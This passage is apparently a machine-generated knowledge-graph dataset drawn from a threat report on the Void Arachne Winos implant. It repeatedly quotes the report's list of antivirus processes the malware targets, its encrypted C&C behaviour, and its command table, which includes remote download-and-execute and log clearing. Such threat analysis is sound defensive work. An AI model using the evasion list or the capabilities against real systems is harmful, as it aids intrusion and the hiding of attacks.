          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **AV vendor** | **Targeted AV process** |\n| 360 Total Security | 360Safe.exe | 360Tray.exe | 360tray.exe | ZhuDongFangYu.exe | 360sd.exe |\n| 金山（Jinshan） | Kxetray.exe | KSafeTray.exe | kscan.exe | kwsprotect64.exe | kxescore.exe |\n| QQ | QQPCRTP.exe | QMDL.exe | QMPersonalCenter.exe | QQPCPatch.exe | QQPCRealTimeSpeedup.exe | QQPCTray.exe | QQRepair.exe |\n| Baidu | BaiduSd.exe | baiduSafeTray.exe |\n| 江民（Jiang Min） | KvMonXP.exe | RavMonD.exe |\n| QuickHeal | QUHLPSVC.EXE |\n| Microsoft MSE | mssecess.exe |\n| Comodo | cfp.exe |\n| DR.WEB | SPIDer.exe |\n| Outpost | acs.exe |\n| 安博士V3 （Dr. An V3） | V3Svc.exe |\n| 韩国胶囊（Korean capsules） | AYAgent.aye |\n| AVG | avgwdsvc.exe |\n| F-Secure | f-secure.exe |\n| 卡巴（Kaba） | avp.exe |\n|  | avpui.exe |\n| McAfee | Mcshield.exe |\n| NOD32 | egui.exe |\n| 可牛（Ke Niu） | knsdtray.exe |\n| Trend Micro | TMBMSRV.exe |\n| 小红伞（Red Umbrella） | avcenter.exe |\n| Norton | rtvscan.exe |\n| Avast | ashDisp.exe |\n| Panda Antivirus Titanium | remupd.exe |\n| BitDefender | vsserv.exe |\n| PSafe | PSafeSysTray.exe |\n| Ad-watch | ad-watch.exe |\n| K7 | K7TSecurity.exe |\n| UnThreat | UnThreat.exe |",
          "chunk_length": 1239,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 434,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 32,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "APPLY",
      "source": "tool--360-total-security",
      "target": "tool--360sd-exe",
      "confidence": 0.95,
      "evidence": "360 Total Security使用360sd.exe进程",
      "chunks_info": [
        {
          "chunk_id": 32,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **AV vendor** | **Targeted AV process** |\n| 360 Total Security | 360Safe.exe | 360Tray.exe | 360tray.exe | ZhuDongFangYu.exe | 360sd.exe |\n| 金山（Jinshan） | Kxetray.exe | KSafeTray.exe | kscan.exe | kwsprotect64.exe | kxescore.exe |\n| QQ | QQPCRTP.exe | QMDL.exe | QMPersonalCenter.exe | QQPCPatch.exe | QQPCRealTimeSpeedup.exe | QQPCTray.exe | QQRepair.exe |\n| Baidu | BaiduSd.exe | baiduSafeTray.exe |\n| 江民（Jiang Min） | KvMonXP.exe | RavMonD.exe |\n| QuickHeal | QUHLPSVC.EXE |\n| Microsoft MSE | mssecess.exe |\n| Comodo | cfp.exe |\n| DR.WEB | SPIDer.exe |\n| Outpost | acs.exe |\n| 安博士V3 （Dr. An V3） | V3Svc.exe |\n| 韩国胶囊（Korean capsules） | AYAgent.aye |\n| AVG | avgwdsvc.exe |\n| F-Secure | f-secure.exe |\n| 卡巴（Kaba） | avp.exe |\n|  | avpui.exe |\n| McAfee | Mcshield.exe |\n| NOD32 | egui.exe |\n| 可牛（Ke Niu） | knsdtray.exe |\n| Trend Micro | TMBMSRV.exe |\n| 小红伞（Red Umbrella） | avcenter.exe |\n| Norton | rtvscan.exe |\n| Avast | ashDisp.exe |\n| Panda Antivirus Titanium | remupd.exe |\n| BitDefender | vsserv.exe |\n| PSafe | PSafeSysTray.exe |\n| Ad-watch | ad-watch.exe |\n| K7 | K7TSecurity.exe |\n| UnThreat | UnThreat.exe |",
          "chunk_length": 1239,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 434,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 32,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--great-wall",
      "target": "tool--jinshan",
      "confidence": 0.95,
      "evidence": "报告中提到了金山（Jinshan）",
      "chunks_info": [
        {
          "chunk_id": 32,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **AV vendor** | **Targeted AV process** |\n| 360 Total Security | 360Safe.exe | 360Tray.exe | 360tray.exe | ZhuDongFangYu.exe | 360sd.exe |\n| 金山（Jinshan） | Kxetray.exe | KSafeTray.exe | kscan.exe | kwsprotect64.exe | kxescore.exe |\n| QQ | QQPCRTP.exe | QMDL.exe | QMPersonalCenter.exe | QQPCPatch.exe | QQPCRealTimeSpeedup.exe | QQPCTray.exe | QQRepair.exe |\n| Baidu | BaiduSd.exe | baiduSafeTray.exe |\n| 江民（Jiang Min） | KvMonXP.exe | RavMonD.exe |\n| QuickHeal | QUHLPSVC.EXE |\n| Microsoft MSE | mssecess.exe |\n| Comodo | cfp.exe |\n| DR.WEB | SPIDer.exe |\n| Outpost | acs.exe |\n| 安博士V3 （Dr. An V3） | V3Svc.exe |\n| 韩国胶囊（Korean capsules） | AYAgent.aye |\n| AVG | avgwdsvc.exe |\n| F-Secure | f-secure.exe |\n| 卡巴（Kaba） | avp.exe |\n|  | avpui.exe |\n| McAfee | Mcshield.exe |\n| NOD32 | egui.exe |\n| 可牛（Ke Niu） | knsdtray.exe |\n| Trend Micro | TMBMSRV.exe |\n| 小红伞（Red Umbrella） | avcenter.exe |\n| Norton | rtvscan.exe |\n| Avast | ashDisp.exe |\n| Panda Antivirus Titanium | remupd.exe |\n| BitDefender | vsserv.exe |\n| PSafe | PSafeSysTray.exe |\n| Ad-watch | ad-watch.exe |\n| K7 | K7TSecurity.exe |\n| UnThreat | UnThreat.exe |",
          "chunk_length": 1239,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 434,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 32,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "APPLY",
      "source": "tool--jinshan",
      "target": "tool--kxetray-exe",
      "confidence": 0.95,
      "evidence": "金山使用Kxetray.exe进程",
      "chunks_info": [
        {
          "chunk_id": 32,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **AV vendor** | **Targeted AV process** |\n| 360 Total Security | 360Safe.exe | 360Tray.exe | 360tray.exe | ZhuDongFangYu.exe | 360sd.exe |\n| 金山（Jinshan） | Kxetray.exe | KSafeTray.exe | kscan.exe | kwsprotect64.exe | kxescore.exe |\n| QQ | QQPCRTP.exe | QMDL.exe | QMPersonalCenter.exe | QQPCPatch.exe | QQPCRealTimeSpeedup.exe | QQPCTray.exe | QQRepair.exe |\n| Baidu | BaiduSd.exe | baiduSafeTray.exe |\n| 江民（Jiang Min） | KvMonXP.exe | RavMonD.exe |\n| QuickHeal | QUHLPSVC.EXE |\n| Microsoft MSE | mssecess.exe |\n| Comodo | cfp.exe |\n| DR.WEB | SPIDer.exe |\n| Outpost | acs.exe |\n| 安博士V3 （Dr. An V3） | V3Svc.exe |\n| 韩国胶囊（Korean capsules） | AYAgent.aye |\n| AVG | avgwdsvc.exe |\n| F-Secure | f-secure.exe |\n| 卡巴（Kaba） | avp.exe |\n|  | avpui.exe |\n| McAfee | Mcshield.exe |\n| NOD32 | egui.exe |\n| 可牛（Ke Niu） | knsdtray.exe |\n| Trend Micro | TMBMSRV.exe |\n| 小红伞（Red Umbrella） | avcenter.exe |\n| Norton | rtvscan.exe |\n| Avast | ashDisp.exe |\n| Panda Antivirus Titanium | remupd.exe |\n| BitDefender | vsserv.exe |\n| PSafe | PSafeSysTray.exe |\n| Ad-watch | ad-watch.exe |\n| K7 | K7TSecurity.exe |\n| UnThreat | UnThreat.exe |",
          "chunk_length": 1239,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 434,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 32,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "APPLY",
      "source": "tool--jinshan",
      "target": "tool--ksafetray-exe",
      "confidence": 0.95,
      "evidence": "金山使用KSafeTray.exe进程",
      "chunks_info": [
        {
          "chunk_id": 32,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **AV vendor** | **Targeted AV process** |\n| 360 Total Security | 360Safe.exe | 360Tray.exe | 360tray.exe | ZhuDongFangYu.exe | 360sd.exe |\n| 金山（Jinshan） | Kxetray.exe | KSafeTray.exe | kscan.exe | kwsprotect64.exe | kxescore.exe |\n| QQ | QQPCRTP.exe | QMDL.exe | QMPersonalCenter.exe | QQPCPatch.exe | QQPCRealTimeSpeedup.exe | QQPCTray.exe | QQRepair.exe |\n| Baidu | BaiduSd.exe | baiduSafeTray.exe |\n| 江民（Jiang Min） | KvMonXP.exe | RavMonD.exe |\n| QuickHeal | QUHLPSVC.EXE |\n| Microsoft MSE | mssecess.exe |\n| Comodo | cfp.exe |\n| DR.WEB | SPIDer.exe |\n| Outpost | acs.exe |\n| 安博士V3 （Dr. An V3） | V3Svc.exe |\n| 韩国胶囊（Korean capsules） | AYAgent.aye |\n| AVG | avgwdsvc.exe |\n| F-Secure | f-secure.exe |\n| 卡巴（Kaba） | avp.exe |\n|  | avpui.exe |\n| McAfee | Mcshield.exe |\n| NOD32 | egui.exe |\n| 可牛（Ke Niu） | knsdtray.exe |\n| Trend Micro | TMBMSRV.exe |\n| 小红伞（Red Umbrella） | avcenter.exe |\n| Norton | rtvscan.exe |\n| Avast | ashDisp.exe |\n| Panda Antivirus Titanium | remupd.exe |\n| BitDefender | vsserv.exe |\n| PSafe | PSafeSysTray.exe |\n| Ad-watch | ad-watch.exe |\n| K7 | K7TSecurity.exe |\n| UnThreat | UnThreat.exe |",
          "chunk_length": 1239,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 434,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 32,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "APPLY",
      "source": "tool--jinshan",
      "target": "tool--kscan-exe",
      "confidence": 0.95,
      "evidence": "金山使用kscan.exe进程",
      "chunks_info": [
        {
          "chunk_id": 32,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **AV vendor** | **Targeted AV process** |\n| 360 Total Security | 360Safe.exe | 360Tray.exe | 360tray.exe | ZhuDongFangYu.exe | 360sd.exe |\n| 金山（Jinshan） | Kxetray.exe | KSafeTray.exe | kscan.exe | kwsprotect64.exe | kxescore.exe |\n| QQ | QQPCRTP.exe | QMDL.exe | QMPersonalCenter.exe | QQPCPatch.exe | QQPCRealTimeSpeedup.exe | QQPCTray.exe | QQRepair.exe |\n| Baidu | BaiduSd.exe | baiduSafeTray.exe |\n| 江民（Jiang Min） | KvMonXP.exe | RavMonD.exe |\n| QuickHeal | QUHLPSVC.EXE |\n| Microsoft MSE | mssecess.exe |\n| Comodo | cfp.exe |\n| DR.WEB | SPIDer.exe |\n| Outpost | acs.exe |\n| 安博士V3 （Dr. An V3） | V3Svc.exe |\n| 韩国胶囊（Korean capsules） | AYAgent.aye |\n| AVG | avgwdsvc.exe |\n| F-Secure | f-secure.exe |\n| 卡巴（Kaba） | avp.exe |\n|  | avpui.exe |\n| McAfee | Mcshield.exe |\n| NOD32 | egui.exe |\n| 可牛（Ke Niu） | knsdtray.exe |\n| Trend Micro | TMBMSRV.exe |\n| 小红伞（Red Umbrella） | avcenter.exe |\n| Norton | rtvscan.exe |\n| Avast | ashDisp.exe |\n| Panda Antivirus Titanium | remupd.exe |\n| BitDefender | vsserv.exe |\n| PSafe | PSafeSysTray.exe |\n| Ad-watch | ad-watch.exe |\n| K7 | K7TSecurity.exe |\n| UnThreat | UnThreat.exe |",
          "chunk_length": 1239,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 434,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 32,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "APPLY",
      "source": "tool--jinshan",
      "target": "tool--kwsprotect64-exe",
      "confidence": 0.95,
      "evidence": "金山使用kwsprotect64.exe进程",
      "chunks_info": [
        {
          "chunk_id": 32,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **AV vendor** | **Targeted AV process** |\n| 360 Total Security | 360Safe.exe | 360Tray.exe | 360tray.exe | ZhuDongFangYu.exe | 360sd.exe |\n| 金山（Jinshan） | Kxetray.exe | KSafeTray.exe | kscan.exe | kwsprotect64.exe | kxescore.exe |\n| QQ | QQPCRTP.exe | QMDL.exe | QMPersonalCenter.exe | QQPCPatch.exe | QQPCRealTimeSpeedup.exe | QQPCTray.exe | QQRepair.exe |\n| Baidu | BaiduSd.exe | baiduSafeTray.exe |\n| 江民（Jiang Min） | KvMonXP.exe | RavMonD.exe |\n| QuickHeal | QUHLPSVC.EXE |\n| Microsoft MSE | mssecess.exe |\n| Comodo | cfp.exe |\n| DR.WEB | SPIDer.exe |\n| Outpost | acs.exe |\n| 安博士V3 （Dr. An V3） | V3Svc.exe |\n| 韩国胶囊（Korean capsules） | AYAgent.aye |\n| AVG | avgwdsvc.exe |\n| F-Secure | f-secure.exe |\n| 卡巴（Kaba） | avp.exe |\n|  | avpui.exe |\n| McAfee | Mcshield.exe |\n| NOD32 | egui.exe |\n| 可牛（Ke Niu） | knsdtray.exe |\n| Trend Micro | TMBMSRV.exe |\n| 小红伞（Red Umbrella） | avcenter.exe |\n| Norton | rtvscan.exe |\n| Avast | ashDisp.exe |\n| Panda Antivirus Titanium | remupd.exe |\n| BitDefender | vsserv.exe |\n| PSafe | PSafeSysTray.exe |\n| Ad-watch | ad-watch.exe |\n| K7 | K7TSecurity.exe |\n| UnThreat | UnThreat.exe |",
          "chunk_length": 1239,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 434,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 32,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "APPLY",
      "source": "tool--jinshan",
      "target": "tool--kxescore-exe",
      "confidence": 0.95,
      "evidence": "金山使用kxescore.exe进程",
      "chunks_info": [
        {
          "chunk_id": 32,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **AV vendor** | **Targeted AV process** |\n| 360 Total Security | 360Safe.exe | 360Tray.exe | 360tray.exe | ZhuDongFangYu.exe | 360sd.exe |\n| 金山（Jinshan） | Kxetray.exe | KSafeTray.exe | kscan.exe | kwsprotect64.exe | kxescore.exe |\n| QQ | QQPCRTP.exe | QMDL.exe | QMPersonalCenter.exe | QQPCPatch.exe | QQPCRealTimeSpeedup.exe | QQPCTray.exe | QQRepair.exe |\n| Baidu | BaiduSd.exe | baiduSafeTray.exe |\n| 江民（Jiang Min） | KvMonXP.exe | RavMonD.exe |\n| QuickHeal | QUHLPSVC.EXE |\n| Microsoft MSE | mssecess.exe |\n| Comodo | cfp.exe |\n| DR.WEB | SPIDer.exe |\n| Outpost | acs.exe |\n| 安博士V3 （Dr. An V3） | V3Svc.exe |\n| 韩国胶囊（Korean capsules） | AYAgent.aye |\n| AVG | avgwdsvc.exe |\n| F-Secure | f-secure.exe |\n| 卡巴（Kaba） | avp.exe |\n|  | avpui.exe |\n| McAfee | Mcshield.exe |\n| NOD32 | egui.exe |\n| 可牛（Ke Niu） | knsdtray.exe |\n| Trend Micro | TMBMSRV.exe |\n| 小红伞（Red Umbrella） | avcenter.exe |\n| Norton | rtvscan.exe |\n| Avast | ashDisp.exe |\n| Panda Antivirus Titanium | remupd.exe |\n| BitDefender | vsserv.exe |\n| PSafe | PSafeSysTray.exe |\n| Ad-watch | ad-watch.exe |\n| K7 | K7TSecurity.exe |\n| UnThreat | UnThreat.exe |",
          "chunk_length": 1239,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 434,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 32,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--behind-great-wall",
      "target": "tool--loginmodule-dll",
      "confidence": 0.95,
      "evidence": "报告分析了LoginModule.dll的功能",
      "chunks_info": [
        {
          "chunk_id": 33,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\nNext, the malware employs the encryption algorithm that we’ve previously discussed to encrypt all collected data. Using the *timeGetTime()* Windows API function, a new key will be generated to encrypt the collected data, which is different from the key used during the stager’s initial request. The malware appends the hardcoded value “06 00” to the encryption key to indicate that this request contains collected data. Unlike the stager, *LoginModule.dll* doesn’t send the key in a separate request, instead, it prefixes the value of the key to the collected data and sends this encrypted request to the C&C server.  \nFigure 40 shows the initial packet that the malware sends.  \nFigure 41.登录模块.dll (LoginModule.dll) decrypted initial traffic  \nThe malware then begins to listen for incoming commands from the C&C server. It can execute a variety of tasks, including loading additional plugins, capturing screenshots, and clearing system logs. These functions are managed and executed through controlled switch statements, ensuring precise and efficient handling of each instruction.  \nTable 7 lists the malware’s supported functionalities.",
          "chunk_length": 1248,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "text",
            "token_length": 227,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 33,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "APPLY",
      "source": "tool--loginmodule-dll",
      "target": "technique--data-encryption",
      "confidence": 0.95,
      "evidence": "LoginModule.dll使用加密算法加密数据",
      "chunks_info": [
        {
          "chunk_id": 33,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\nNext, the malware employs the encryption algorithm that we’ve previously discussed to encrypt all collected data. Using the *timeGetTime()* Windows API function, a new key will be generated to encrypt the collected data, which is different from the key used during the stager’s initial request. The malware appends the hardcoded value “06 00” to the encryption key to indicate that this request contains collected data. Unlike the stager, *LoginModule.dll* doesn’t send the key in a separate request, instead, it prefixes the value of the key to the collected data and sends this encrypted request to the C&C server.  \nFigure 40 shows the initial packet that the malware sends.  \nFigure 41.登录模块.dll (LoginModule.dll) decrypted initial traffic  \nThe malware then begins to listen for incoming commands from the C&C server. It can execute a variety of tasks, including loading additional plugins, capturing screenshots, and clearing system logs. These functions are managed and executed through controlled switch statements, ensuring precise and efficient handling of each instruction.  \nTable 7 lists the malware’s supported functionalities.",
          "chunk_length": 1248,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "text",
            "token_length": 227,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 33,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--encryption-key-generation",
      "target": "tool--loginmodule-dll",
      "confidence": 0.95,
      "evidence": "LoginModule.dll生成加密密钥",
      "chunks_info": [
        {
          "chunk_id": 33,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\nNext, the malware employs the encryption algorithm that we’ve previously discussed to encrypt all collected data. Using the *timeGetTime()* Windows API function, a new key will be generated to encrypt the collected data, which is different from the key used during the stager’s initial request. The malware appends the hardcoded value “06 00” to the encryption key to indicate that this request contains collected data. Unlike the stager, *LoginModule.dll* doesn’t send the key in a separate request, instead, it prefixes the value of the key to the collected data and sends this encrypted request to the C&C server.  \nFigure 40 shows the initial packet that the malware sends.  \nFigure 41.登录模块.dll (LoginModule.dll) decrypted initial traffic  \nThe malware then begins to listen for incoming commands from the C&C server. It can execute a variety of tasks, including loading additional plugins, capturing screenshots, and clearing system logs. These functions are managed and executed through controlled switch statements, ensuring precise and efficient handling of each instruction.  \nTable 7 lists the malware’s supported functionalities.",
          "chunk_length": 1248,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "text",
            "token_length": 227,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 33,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--c2-communication",
      "target": "tool--loginmodule-dll",
      "confidence": 0.95,
      "evidence": "LoginModule.dll与C&C服务器通信",
      "chunks_info": [
        {
          "chunk_id": 33,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\nNext, the malware employs the encryption algorithm that we’ve previously discussed to encrypt all collected data. Using the *timeGetTime()* Windows API function, a new key will be generated to encrypt the collected data, which is different from the key used during the stager’s initial request. The malware appends the hardcoded value “06 00” to the encryption key to indicate that this request contains collected data. Unlike the stager, *LoginModule.dll* doesn’t send the key in a separate request, instead, it prefixes the value of the key to the collected data and sends this encrypted request to the C&C server.  \nFigure 40 shows the initial packet that the malware sends.  \nFigure 41.登录模块.dll (LoginModule.dll) decrypted initial traffic  \nThe malware then begins to listen for incoming commands from the C&C server. It can execute a variety of tasks, including loading additional plugins, capturing screenshots, and clearing system logs. These functions are managed and executed through controlled switch statements, ensuring precise and efficient handling of each instruction.  \nTable 7 lists the malware’s supported functionalities.",
          "chunk_length": 1248,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "text",
            "token_length": 227,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 33,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "LAUNCH",
      "source": "technique--command-execution",
      "target": "procedure--c2-communication",
      "confidence": 0.95,
      "evidence": "命令执行技术通过C&C通信实现",
      "chunks_info": [
        {
          "chunk_id": 33,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\nNext, the malware employs the encryption algorithm that we’ve previously discussed to encrypt all collected data. Using the *timeGetTime()* Windows API function, a new key will be generated to encrypt the collected data, which is different from the key used during the stager’s initial request. The malware appends the hardcoded value “06 00” to the encryption key to indicate that this request contains collected data. Unlike the stager, *LoginModule.dll* doesn’t send the key in a separate request, instead, it prefixes the value of the key to the collected data and sends this encrypted request to the C&C server.  \nFigure 40 shows the initial packet that the malware sends.  \nFigure 41.登录模块.dll (LoginModule.dll) decrypted initial traffic  \nThe malware then begins to listen for incoming commands from the C&C server. It can execute a variety of tasks, including loading additional plugins, capturing screenshots, and clearing system logs. These functions are managed and executed through controlled switch statements, ensuring precise and efficient handling of each instruction.  \nTable 7 lists the malware’s supported functionalities.",
          "chunk_length": 1248,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "text",
            "token_length": 227,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 33,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--great-wall",
      "target": "technique--plugin-loading",
      "confidence": 0.95,
      "evidence": "报告中提到了加载插件的技术",
      "chunks_info": [
        {
          "chunk_id": 34,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\n| --- | --- |\n| **Commands** | **Description** |\n| 0 | Load plugins |\n| 1 | Load the plugin and update the registry |\n| 2 | Terminate the connection |\n| 3 | Send the active window information and capture a screenshot |\n| 4 | Capture a screenshot |\n| 5 | Execute file and commands |\n| 6 | Download a file from the given URL and execute it |\n| 7 | Modify the registry value of specific keys and, if the key doesn’t exist, create it |\n| 8 | Check whether a process with the provided name exists on the system by enumerating the list of running processes |\n| 9 | N/A |\n| 10 | Capture a screenshot |\n| 11 | Clear system logs: Application, security, and system |\n| 12 | Restart the process |\n| 13 | Terminate the process |\n| 14 | Logout from the system |\n| 15 | Restart the system |\n| 16 | Shutdown the system |\n| 17 | Change the default plugin loading method |\n| 18 | Update configuration settings |\n| 19 | Create a new C&C thread and perform system information collection |\n| 100 | Set the value of*IpDatespecial*registry |\n| 101 | Remove the value of*IpDatespecial*registry |",
          "chunk_length": 1180,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos main implant analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos main implant analysis"
            ],
            "content_type": "table",
            "token_length": 235,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 34,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--great-wall",
      "target": "technique--registry-modification",
      "confidence": 0.95,
      "evidence": "报告中提到了修改注册表的技术",
      "chunks_info": [
        {
          "chunk_id": 34,
          "chunk_type": "table",
